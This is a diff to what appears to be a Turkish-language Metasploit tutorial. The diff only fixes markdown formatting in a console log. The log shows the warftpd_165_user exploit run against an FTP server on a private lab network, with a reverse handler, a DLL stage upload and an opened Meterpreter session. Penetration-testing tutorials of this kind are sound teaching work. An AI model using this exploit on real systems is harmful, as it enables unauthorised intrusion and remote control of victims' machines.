@@ -51,19 +51,19 @@ Bir sisteme giriş sağlandığında iki yaklaşım sergileyebilirsiniz. Çok h�
 
 
 ```bash
-msf exploit**(**warftpd_165_user**)** > exploit
+msf exploit(warftpd_165_user) > exploit
 
 > Handler binding to LHOST 0.0.0.0
 > Started reverse handler
 > Connecting to FTP server 172.16.104.145:21...
 > Connected to target FTP server.
 > Trying target Windows 2000 SP0-SP4 English...
-> Transmitting intermediate stager **for **over-sized stage...**(**191 bytes**)**
-> Sending stage **(**2650 bytes**)**
+> Transmitting intermediate stager for **over-sized stage...(191 bytes)
+> Sending stage (2650 bytes)
 > Sleeping before handling stage...
-> Uploading DLL **(**75787 bytes**)**...
+> Uploading DLL (75787 bytes)...
 > Upload completed.
-> Meterpreter session 4 opened **(**172.16.104.130:4444 -> 172.16.104.145:1246**)**
+> Meterpreter session 4 opened (172.16.104.130:4444 -> 172.16.104.145:1246)
 
 meterpreter >
 ```
